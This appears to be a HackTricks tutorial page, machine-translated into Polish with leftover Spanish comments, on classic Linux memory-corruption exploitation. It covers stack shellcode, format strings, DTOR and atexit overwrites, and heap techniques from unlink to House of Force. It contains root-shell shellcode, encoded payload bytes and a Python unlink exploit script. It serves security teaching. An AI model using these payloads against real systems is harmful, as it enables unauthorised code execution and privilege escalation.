# Eksploitacja systemu Linux (Podstawy)

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## **2.SHELLCODE**

View kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; clear eax\
xor ebx, ebx ; ebx = 0 as there are no arguments to pass\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; Execute syscall

**nasm -f elf assembly.asm** —> Returns a .o file\
**ld assembly.o -o shellcodeout** —> Gives us an executable formed by the assembly code and we can extract the opcodes with **objdump**\
**objdump -d -Mintel ./shellcodeout** —> To verify that it is indeed our shellcode and extract the OpCodes

**Verify that the shellcode works**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
Aby sprawdzić, czy wywołania systemowe są wykonywane poprawnie, należy skompilować poprzedni program, a wywołania systemowe powinny pojawić się w **strace ./SKOMPILOWANY\_PROGRAM**

Podczas tworzenia shellcode'u można zastosować sztuczkę. Pierwsza instrukcja to skok do wywołania. Wywołanie wykonuje oryginalny kod i dodatkowo umieszcza EIP na stosie. Po instrukcji call umieszczamy potrzebny nam ciąg znaków, dzięki czemu za pomocą tego EIP możemy wskazać na ciąg znaków i kontynuować wykonywanie kodu.

EJ **SZTUCZKA (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**Użycie ESP z użyciem stosu (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Łowca jajek:**

Polega na małym kodzie, który przeszukuje strony pamięci powiązane z procesem w poszukiwaniu tam przechowywanej shellcode (szuka jakiegoś podpisu umieszczonego w shellcode). Przydatne w przypadkach, gdy jest tylko niewielka przestrzeń do wstrzyknięcia kodu.

**Shellkody polimorficzne**

Polegają na zaszyfrowanych shellach, które posiadają małe kody deszyfrujące i skaczące do nich, używając sztuczki Call-Pop, oto **przykład zaszyfrowanego szyfru Cezara**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
## **5. Metody uzupełniające**

**Ret2Ret**

Przydatne, gdy nie można umieścić adresu stosu w EIP (sprawdzane jest, czy EIP nie zawiera 0xbf) lub gdy nie można obliczyć lokalizacji shellcode. Jednak funkcja podatna akceptuje parametr (shellcode zostanie umieszczona tutaj).

W ten sposób, zmieniając EIP na adres **ret**, zostanie załadowany następny adres (który jest adresem pierwszego argumentu funkcji). Innymi słowy, zostanie załadowana shellcode.

Exploit będzie wyglądał tak: SHELLCODE + Wypełnienie (do EIP) + **\&ret** (następne bajty stosu wskazują na początek shellcode, ponieważ adres przekazany do stosu wskazuje na argument przekazany)

Wygląda na to, że funkcje takie jak **strncpy** po zakończeniu usuwają ze stosu adres, w którym przechowywana była shellcode, uniemożliwiając tę technikę. Innymi słowy, adres przekazywany funkcji jako argument (ten, który przechowuje shellcode) jest modyfikowany na 0x00, więc po wywołaniu drugiego **ret** program napotyka na 0x00 i kończy działanie.

**Technika Murata**

W systemie Linux wszystkie programy są mapowane zaczynając od 0xbfffffff.

Analizując, jak jest budowany stos nowego procesu w systemie Linux, można opracować exploit tak, aby program został uruchomiony w środowisku, w którym jedyną zmienną jest shellcode. Adres tej zmiennej można obliczyć jako: addr = 0xbfffffff - 4 - strlen(NAZWA\_PEŁNEGO\_PLIKU\_WYKONAWCZEGO) - strlen(shellcode)

W ten sposób można łatwo uzyskać adres zmiennej środowiskowej z shellcode.

Możliwe jest to dzięki funkcji execle, która pozwala tworzyć środowisko zawierające tylko pożądane zmienne środowiskowe.

**Skok do ESP: Styl Windows**

Ponieważ ESP zawsze wskazuje na początek stosu, ta technika polega na zastąpieniu EIP adresem wywołania **jmp esp** lub **call esp**. W ten sposób shellcode jest zapisywana po nadpisaniu EIP, ponieważ po wykonaniu **ret** ESP wskazuje na następny adres, dokładnie tam, gdzie zapisano shellcode.

W przypadku braku aktywnego ASLR w systemie Windows lub Linux można wywołać **jmp esp** lub **call esp** przechowywane w jakimś obiekcie współdzielonym. Jeśli ASLR jest aktywny, można poszukać ich w samym programie podatnym.

Ponadto możliwość umieszczenia shellcode po skorumpowaniu EIP zamiast w środku stosu pozwala uniknąć dotknięcia shellcode przez instrukcje push lub pop wykonywane w trakcie funkcji (co mogłoby się zdarzyć, gdyby była umieszczona w środku stosu funkcji).

Podobnie, jeśli wiadomo, że funkcja zwraca adres, w którym przechowywana jest shellcode, można wywołać **call eax** lub **jmp eax (ret2eax).**

**Przepełnienia liczb całkowitych**

Tego rodzaju przepełnienia występują, gdy zmienna nie jest przygotowana na obsługę tak dużej liczby, jaką się jej przekazuje, być może z powodu pomyłki między zmiennymi ze znakiem i bez znaku, na przykład:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
W powyższym przykładzie widzimy, że program oczekuje 2 parametrów. Pierwszy to długość następnego ciągu, a drugi to sam ciąg.

Jeśli podamy jako pierwszy parametr liczbę ujemną, program wyświetli, że len < 256 i przejdzie przez ten filtr, a ponadto strlen(buffer) będzie mniejsze niż l, ponieważ l jest typu unsigned int i będzie bardzo duże.

Ten rodzaj przepełnień nie ma na celu zapisywania czegoś w procesie programu, ale przejście przez źle zaprojektowane filtry w celu wykorzystania innych podatności.

**Zmienne niezainicjowane**

Nie wiadomo, jaka wartość może przyjąć zmienna niezainicjowana, co może być interesujące do obserwacji. Może się okazać, że przyjmie wartość zmiennej z poprzedniej funkcji, która jest kontrolowana przez atakującego.

##

###

###

###

### **.fini\_array**

W zasadzie jest to struktura z **funkcjami, które zostaną wywołane** przed zakończeniem programu. Jest to interesujące, jeśli można wywołać **swoje shellcode, skacząc do określonego adresu**, lub w przypadkach, gdy trzeba wrócić ponownie do funkcji main, aby **wykorzystać drugi raz formatowanie łańcucha**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Zauważ, że to **nie** spowoduje **wiecznej pętli**, ponieważ gdy wrócisz do głównej funkcji, canary zauważy, że koniec stosu może być uszkodzony i funkcja nie zostanie ponownie wywołana. Dzięki temu będziesz mógł **wykonać 1 dodatkowe** wywołanie podatności.

### **Formatowanie łańcucha znaków do wycieku zawartości**

Łańcuch znaków może również być wykorzystany do **wycieku zawartości** z pamięci programu.\
Na przykład, w następującej sytuacji istnieje **zmienna lokalna na stosie wskazująca na flagę**. Jeśli **znajdziesz**, gdzie w **pamięci** jest **wskaźnik** do **flagi**, możesz sprawić, że **printf** uzyska dostęp do tego **adresu** i **wyświetli** flagę:

Więc flaga jest pod adresem **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

A z wycieku widać, że **wskaźnik do flagi** znajduje się w **8. parametrze**:

![](<../../.gitbook/assets/image (623).png>)

Więc, **uzyskując dostęp** do **8. parametru**, możesz uzyskać flagę:

![](<../../.gitbook/assets/image (624).png>)

Zauważ, że po **poprzednim ataku** i zrozumieniu, że możesz **wyciekać zawartość**, możesz **ustawić wskaźniki** na **`printf`** w sekcji, gdzie jest **załadowany** **plik wykonywalny** i **wyciekać** go **całkowicie**!

### **DTOR**

{% hint style="danger" %}
Obecnie jest bardzo **dziwne znalezienie binarnego pliku z sekcją dtor**.
{% endhint %}

Destruktory to funkcje, które są **wykonywane przed zakończeniem programu**.\
Jeśli uda ci się **zapisać** adres **shellcode** w **`__DTOR_END__`**, to zostanie **wykonany** przed zakończeniem programu.\
Uzyskaj adres tej sekcji za pomocą:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
Zazwyczaj znajdziesz sekcję **DTOR** **między** wartościami `ffffffff` i `00000000`. Jeśli widzisz tylko te wartości, oznacza to, że **nie ma zarejestrowanej żadnej funkcji**. **Nadpisz** więc **`00000000`** adresem **shellcode**, aby go wykonać.

### **Formatowanie łańcuchów do przepełnień bufora**

Funkcja **sprintf** przesuwa sformatowany łańcuch **do** zmiennej. Dlatego można nadużyć **formatowania** łańcucha, aby spowodować **przepełnienie bufora w zmiennej**, do której jest kopiowana zawartość.\
Na przykład ładunek `%.44xAAAA` **zapisze 44B+"AAAA" w zmiennej**, co może spowodować przepełnienie bufora.

### **Struktury \_\_atexit**

{% hint style="danger" %}
Obecnie jest bardzo **dziwne, aby to wykorzystać**.
{% endhint %}

Funkcja **`atexit()`** to funkcja, do której **przekazywane są inne funkcje jako parametry**. Te **funkcje** zostaną **wykonane** podczas wykonywania **`exit()`** lub **powrotu** do **main**.\
Jeśli można **zmodyfikować** **adres** którejś z tych **funkcji**, aby wskazywał na shellcode na przykład, uzyskasz **kontrolę** nad **procesem**, ale obecnie jest to bardziej skomplikowane.\
Obecnie **adresy funkcji** do wykonania są **ukryte** za kilkoma strukturami, a ostatecznie adres, do którego wskazują, nie jest adresem funkcji, ale jest **zaszyfrowany za pomocą operacji XOR** i przesunięć z **losowym kluczem**. Dlatego obecnie ten wektor ataku **nie jest bardzo przydatny przynajmniej na x86** i **x64\_86**.\
Funkcja **szyfrowania** to **`PTR_MANGLE`**. **Inne architektury** takie jak m68k, mips32, mips64, aarch64, arm, hppa... **nie implementują funkcji szyfrowania**, ponieważ **zwracają to samo**, co otrzymały jako dane wejściowe. Dlatego te architektury mogą być podatne na ten wektor ataku.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Obecnie jest bardzo **dziwne, aby to wykorzystać**.
{% endhint %}

**`Setjmp()`** pozwala **zapisać** **kontekst** (rejestry)\
**`longjmp()`** pozwala **przywrócić** **kontekst**.\
Zapisane rejestry to: `EBX, ESI, EDI, ESP, EIP, EBP`\
To, co się dzieje, to że EIP i ESP są przekazywane przez funkcję **`PTR_MANGLE`**, więc **architektura podatna na ten atak jest taka sama jak powyżej**.\
Są one przydatne do odzyskiwania błędów lub przerwań.\
Jednak z tego, co przeczytałem, inne rejestry nie są chronione, **więc jeśli wewnątrz wywoływanej funkcji jest `call ebx`, `call esi` lub `call edi`**, kontrolę można przejąć. Lub można również zmodyfikować EBP, aby zmodyfikować ESP.

**VTable i VPTR w C++**

Każda klasa ma **Vtable**, która jest tablicą **wskaźników do metod**.

Każdy obiekt klasy ma **VPtr**, który jest **wskaźnikiem** do tablicy swojej klasy. VPtr jest częścią nagłówka każdego obiektu, więc jeśli **nadpiszesz** **VPtr**, można go **zmienić**, aby wskazywał na metodę-dummy, dzięki czemu wykonanie funkcji przejdzie do shellcode.

## **Środki zapobiegawcze i unikanie**

###

**Zastąpienie Libsafe**

Włącza się za pomocą: LD\_PRELOAD=/lib/libsafe.so.2\
lub\
“/lib/libsave.so.2” > /etc/ld.so.preload

Niektóre niebezpieczne wywołania funkcji są przechwytywane przez bezpieczne wywołania. Nie jest to standaryzowane. (tylko dla x86, nie dla kompilacji z -fomit-frame-pointer, nie dla statycznych kompilacji, nie wszystkie funkcje podatne na atak stają się bezpieczne, a LD\_PRELOAD nie działa w binariach z ustawionym suid).

**ASCII Armored Address Space**

Polega na załadowaniu współdzielonych bibliotek od 0x00000000 do 0x00ffffff, aby zawsze był bajt 0x00. Jednakże to naprawdę nie zatrzymuje praktycznie żadnego ataku, a tym bardziej w little endian.

**ret2plt**

Polega na wykonaniu ROP w taki sposób, że wywoływana jest funkcja strcpy@plt (z plt) i wskazuje się na wpis w GOT, a następnie kopiowany jest pierwszy bajt funkcji, do której chcemy wywołać (system()). Następnie to samo jest robione wskazując na GOT+1 i kopiując 2. bajt system()... Na końcu wywoływany jest zapisany adres w GOT, który będzie system()

**Klatki z chroot()**

debootstrap -arch=i386 hardy /home/user —> Instaluje podstawowy system w określonym podkatalogu

Administrator może wyjść z takiej klatki wykonując: mkdir foo; chroot foo; cd ..

**Instrumentacja kodu**

Valgrind —> Szuka błędów\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Przepełnienia sterty: Podstawowe ataki**

**Przydzielony kawałek**

prev\_size |\
size | —Nagłówek\
\*mem | Dane

**Wolny kawałek**

prev\_size |\
size |\
\*fd | Wskaźnik na następny kawałek\
\*bk | Wskaźnik na poprzedni kawałek —Nagłówek\
\*mem | Dane

Wolne kawałki są w liście dwukierunkowej (bin) i nigdy nie mogą być dwa wolne kawałki obok siebie (są łączone)

W "size" są bity wskazujące: czy poprzedni kawałek jest używany, czy kawałek został przydzielony za pomocą mmap() i czy kawałek należy do głównego obszaru.

Po zwolnieniu kawałka, jeśli którykolwiek z sąsiednich jest wolny, są one łączone za pomocą makra unlink() i nowy, większy kawałek jest przekazywany do frontlink() w celu wstawienia go do odpowiedniego binu.

unlink(){\
BK = P->bk; —> BK nowego kawałka to BK poprzedniego wolnego kawałka\
FD = P->fd; —> FD nowego kawałka to FD poprzedniego wolnego kawałka\
FD->bk = BK; —> BK następnego kawałka wskazuje na nowy kawałek\
BK->fd = FD; —> FD poprzedniego kawałka wskazuje na nowy kawałek\
}

Dlatego jeśli uda się zmodyfikować P->bk adresem shellcode i P->fd adresem w DTORS lub GOT pomniejszonym o 12, osiągniesz:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

W ten sposób shellcode zostanie wykonana po opuszczeniu programu.

Dodatkowo, 4. instrukcja unlink() zapisuje coś, a shellcode musi być dostosowana do tego:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) —> Spowoduje to zapisanie 4 bajtów od 8 bajtu shellcode, dlatego pierwsza instrukcja shellcode musi być skokiem, aby ominąć to i przejść do nops prowadzących do reszty shellcode.

Dlatego exploit jest tworzony:

W buforze1 umieszczamy shellcode zaczynając od skoku, aby przejść do nops lub reszty shellcode.

Następnie po shellcode dodajemy wypełnienie do osiągnięcia pola prev\_size i size następnego kawałka. W tych miejscach umieszczamy 0xfffffff0 (aby nadpisać prev\_size i ustawić bit wskazujący, że jest wolny) i “-4” (0xfffffffc) w size (aby podczas sprawdzania w 3. kawałku, czy 2. był wolny, w rzeczywistości przejdzie do zmodyfikowanego prev\_size, który powie, że jest wolny) -> Dlatego gdy free() sprawdzi, przejdzie do size 3., ale w rzeczywistości przejdzie do 2. - 4 i uzna, że 2. kawałek jest wolny. Następnie wywoła **unlink()**.

Podczas wywoływania unlink() użyje danych z początku 2. kawałka jako P->fd, więc tam zostanie wstawiony adres, który chcesz nadpisać - 12 (ponieważ w FD->bk zostanie dodane 12 do adresu przechowywanego w FD). A pod tym adresem zostanie umieszczony drugi adres z 2. kawałka, który będzie interesujący dla nas jako adres shellcode (fałszywy P->bk).
**shellcode = "\xeb\x0caaaabbbbcccc" #skok 12 + 12 bajtów wypełnienia**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo está libre esté a 1**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, para que piense que el “size” del 3º trozo está 4bytes detrás (apunta a prev\_size) pues es ahí donde mira si el 2º trozo está libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #W ładunku na początku dodajemy 8 bajtów wypełnienia**

**got\_free = pack("\<I", 0x08048300 - 12) #Adres free() w plt-12 (będzie nadpisany, aby uruchomić shellcode drugi raz, gdy free() zostanie wywołane ponownie)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Jak wspomniano, ładunek zaczyna się od 8 bajtów wypełnienia**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modyfikujemy 2. kawałek, got\_free wskazuje, gdzie zapiszemy adres addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() zwalniając w odwrotnej kolejności (wargame)**

Kontrolujemy 3 kolejne fragmenty i są one zwalniane w odwrotnej kolejności niż zarezerwowane.

W tym przypadku:

W fragmencie c umieszczamy shellcode

Fragment a używamy do nadpisania b, aby rozmiar miał wyłączony bit PREV\_INUSE, aby myślał, że fragment a jest wolny.

Dodatkowo, nadpisujemy w nagłówku b rozmiar, aby wynosił -4.

W rezultacie program uzna, że „a” jest wolny i w binie, więc wywoła unlink() aby go odłączyć. Jednakże, ponieważ nagłówek PREV\_SIZE wynosi -4, uzna, że fragment „a” zaczyna się naprawdę w b+4. Innymi słowy, wywoła unlink() na fragmencie rozpoczynającym się od b+4, więc w b+12 będzie wskaźnik „fd”, a w b+16 będzie wskaźnik „bk”.

W ten sposób, jeśli w bk umieścimy adres shellcode, a w fd umieścimy adres funkcji „puts()”-12, mamy nasz payload.

**Technika Frontlink**

Frontlink jest wywoływany, gdy coś jest zwalniane i żaden z sąsiednich fragmentów nie jest wolny, wtedy nie jest wywoływane unlink(), ale bezpośrednio frontlink().

Użyteczna podatność, gdy atakowany malloc nigdy nie jest zwalniany (free()).

Wymagane:

Bufor, który może zostać przepełniony funkcją wejściową

Bufor sąsiadujący z tym, który zostanie zwolniony, a który będzie modyfikowany przez przepełnienie poprzedniego bufora

Bufor do zwolnienia o rozmiarze większym niż 512, ale mniejszym niż poprzedni bufor

Bufor zadeklarowany przed krokiem 3, który pozwala na nadpisanie prev\_size tego bufora

W ten sposób, nadpisując w dwóch mallocach w sposób niekontrolowany i w jednym kontrolowanym, który jest zwalniany tylko raz, możemy przeprowadzić exploit.

**Podatność double free()**

Jeśli free() jest wywoływane dwa razy z tym samym wskaźnikiem, powstają dwa biny wskazujące na ten sam adres.

Jeśli chcemy ponownie użyć jednego, zostanie on przydzielony bez problemów. Jeśli chcemy użyć innego, zostanie on przydzielony ten sam obszar, więc mamy fałszywe wskaźniki „fd” i „bk” z danymi, które zapisze poprzednia rezerwacja.

**After free()**

Wcześniej zwolniony wskaźnik jest ponownie używany bez kontroli.

## **8 Przepełnienia sterty: Zaawansowane exploitacje**

Techniki Unlink() i FrontLink() zostały usunięte po zmodyfikowaniu funkcji unlink().

**The house of mind**

Wystarczy jedno wywołanie free(), aby spowodować wykonanie arbitralnego kodu. Ważne jest znalezienie drugiego fragmentu, który może zostać przepełniony przez poprzedni i zwolniony.

Wywołanie free() powoduje wywołanie public\_fREe(mem), który wykonuje:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> Zwraca wskaźnik do miejsca, od którego zaczyna się fragment (mem-8)

…

ar\_ptr = arena\_for_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

W \[1] sprawdzany jest rozmiar pola bitu NON\_MAIN\_ARENA, który można zmienić, aby sprawdzenie zwróciło true i wywołało heap\_for\_ptr(), które wykonuje operację and na „mem”, ustawiając na 0 2,5 najmniej znaczących bajtów (w naszym przypadku z 0x0804a000 robi 0x08000000) i uzyskuje dostęp do 0x08000000->ar\_ptr (jak do struct heap\_info)

W ten sposób, jeśli możemy kontrolować fragment na przykład w 0x0804a000 i fragment w **0x081002a0** zostanie zwolniony, możemy dotrzeć do adresu 0x08100000 i zapisać cokolwiek chcemy, na przykład **0x0804a000**. Gdy ten drugi fragment zostanie zwolniony, heap\_for\_ptr(ptr)->ar\_ptr zwróci to, co napisaliśmy w 0x08100000 (ponieważ stosuje się do 0x081002a0 operację and, którą widzieliśmy wcześniej, i stąd wyciąga wartość 4 pierwszych bajtów, ar\_ptr)

W ten sposób zostanie wywołane \_int\_free(ar\_ptr, mem), czyli **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Jak widzieliśmy wcześniej, możemy kontrolować wartość av, ponieważ to, co piszemy w zwalnianym fragmencie, jest tym, co zostanie zapisane w av.

Zgodnie z definicją unsorted\_chunks, wiemy, że:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Dlatego jeśli w av->bins\[2] zapiszemy wartość \_\_DTOR\_END\_\_-12, w ostatniej instrukcji zostanie zapisane w \_\_DTOR\_END\_\_ adres drugiego fragmentu.

Innymi słowy, na początku pierwszego fragmentu musimy umieścić wiele razy adres \_\_DTOR\_END\_\_-12, ponieważ av->bins\[2] to z niego weźmie.

W miejscu, gdzie znajdzie się adres drugiego fragmentu z ostatnimi 5 zerami, należy zapisać adres tego pierwszego fragmentu, aby heap\_for\_ptr() myślał, że ar\_ptr zaczyna się na początku pierwszego fragmentu i wyciągnął z niego av->bins\[2]

W drugim fragmencie, dzięki pierwszemu, nadpisujemy prev\_size skokiem 0x0c i rozmiarem czegoś, aby aktywować -> NON\_MAIN\_ARENA

Następnie w drugim fragmencie umieszczamy mnóstwo nops i na końcu shellcode

W ten sposób zostanie wywołane \_int\_free(TROZO1, TROZO2) i zostaną wykonane instrukcje, aby zapisać w \_\_DTOR\_END\_\_ adres prev\_size TROZO2, który skoczy do shellcode.
Aby zastosować tę technikę, konieczne jest spełnienie kilku dodatkowych wymagań, które nieco komplikują payload.

Ta technika nie jest już stosowana, ponieważ zastosowano prawie ten sam patch co dla unlink. Sprawdzane jest, czy nowa lokalizacja, do której się odwołujemy, również odwołuje się do nas.

**Fastbin**

To wariant The House of Mind

Naszym celem jest wykonanie następującego kodu, do którego dochodzi po pierwszej weryfikacji funkcji \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] —> Gdzie fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

W ten sposób, jeśli umieścimy "fb" w adresie funkcji w GOT, na tym adresie zostanie umieszczony adres nadpisanej części. Aby to osiągnąć, konieczne jest, aby arena była blisko adresów dtors. Dokładniej mówiąc, av->max\_fast musi znajdować się pod adresem, który zamierzamy nadpisać.

Ponieważ z The House of Mind widzieliśmy, że kontrolowaliśmy pozycję av.

Jeśli więc w polu size podamy rozmiar 8 + NON\_MAIN\_ARENA + PREV\_INUSE —> fastbin\_index() zwróci fastbins\[-1\], który wskaże na av->max\_fast

W tym przypadku av->max\_fast będzie adresem, który zostanie nadpisany (nie ten, do którego wskazuje, ale ta pozycja zostanie nadpisana).

Dodatkowo, fragment obok zwolnionego kawałka musi być większy niż 8 -> Ponieważ powiedzieliśmy, że rozmiar zwolnionego kawałka to 8, w tym fałszywym kawałku musimy umieścić rozmiar większy niż 8 (ponieważ shellcode będzie w zwolnionym kawałku, na początku trzeba umieścić skok, który trafi w nops).

Dodatkowo, ten sam fałszywy kawałek musi być mniejszy niż av->system\_mem. av->system\_mem znajduje się 1848 bajtów dalej.

Z powodu zer w \_DTOR\_END\_ i niewielu adresów w GOT, żaden z tych adresów nie nadaje się do nadpisania, zobaczmy więc, jak zastosować fastbin do ataku na stos.

Innym sposobem ataku jest przekierowanie **av** na stos.

Jeśli zmienimy rozmiar na 16 zamiast 8, wtedy: fastbin\_index() zwróci fastbins\[0\] i możemy z tego skorzystać, aby nadpisać stos.

W tym celu nie powinno być żadnych canary ani dziwnych wartości na stosie, faktycznie musimy znaleźć się w takim miejscu: 4 bajty zerowe + EBP + RET

4 bajty zerowe są potrzebne, aby **av** znajdował się pod tym adresem, a pierwszym elementem **av** jest mutex, który musi wynosić 0.

**av->max\_fast** będzie EBP i będzie wartością, która pozwoli nam ominąć ograniczenia.

W **av->fastbins\[0\]** zostanie nadpisany adresem **p** i będzie RET, co spowoduje skok do shellcode.

Dodatkowo, w **av->system\_mem** (1484 bajty powyżej pozycji na stosie) będzie dużo śmieci, które pozwolą nam ominąć sprawdzanie.

Dodatkowo, ten sam fałszywy kawałek musi być większy niż 8 -> Ponieważ powiedzieliśmy, że rozmiar zwolnionego kawałka to 16, w tym fałszywym kawałku musimy umieścić rozmiar większy niż 8 (ponieważ shellcode będzie w zwolnionym kawałku, na początku trzeba umieścić skok, który trafi w nops, które znajdują się po polu size nowego fałszywego kawałka).

**The House of Spirit**

W tym przypadku chcemy mieć wskaźnik do malloc, który może być modyfikowany przez atakującego (np. wskaźnik znajduje się na stosie pod potencjalnym przepełnieniem zmiennej).

W ten sposób możemy sprawić, że ten wskaźnik wskazuje dokąd chcemy. Jednak nie każde miejsce jest odpowiednie, rozmiar fałszywego kawałka musi być mniejszy niż av->max\_fast i bardziej konkretne, równy rozmiarowi żądanemu w przyszłym wywołaniu malloc()+8. Dlatego jeśli wiemy, że po tym podatnym wskaźniku następuje wywołanie malloc(40), rozmiar fałszywego kawałka musi wynosić 48.

Na przykład, jeśli program pyta użytkownika o liczbę, możemy wprowadzić 48 i skierować modyfikowalny wskaźnik malloc na następne 4 bajty (które mogą należeć do EBP, dzięki czemu 48 pozostaje z tyłu, jakby to była nagłówek size). Ponadto, adres ptr-4+48 musi spełniać kilka warunków (w tym przypadku ptr=EBP), czyli 8 < ptr-4+48 < av->system\_mem.

Jeśli to się spełni, gdy zostanie wywołane kolejne malloc, które powiedzieliśmy, że jest malloc(40), jako adres zostanie przypisany adres EBP. Jeśli atakujący może również kontrolować to, co jest zapisywane w tym malloc, może nadpisać zarówno EBP, jak i EIP dowolnym adresem.

Myślę, że dlatego, gdy zostanie zwolnione free(), zostanie zachowana informacja, że w miejscu wskazującym na EBP stosu znajduje się kawałek o idealnym rozmiarze dla nowego malloc(), który chcemy zarezerwować, więc przypisuje mu ten adres.

**The House of Force**

Potrzebne jest:

* Przepełnienie kawałka, które pozwala na nadpisanie wilderness
* Wywołanie malloc() z rozmiarem zdefiniowanym przez użytkownika
* Wywołanie malloc(), których dane mogą być zdefiniowane przez użytkownika

Pierwszą rzeczą, którą robimy, jest nadpisanie rozmiaru kawałka wilderness bardzo dużą wartością (0xffffffff), dzięki czemu każde żądanie pamięci wystarczająco duże będzie obsługiwane w \_int\_malloc() bez konieczności rozszerzania sterty.

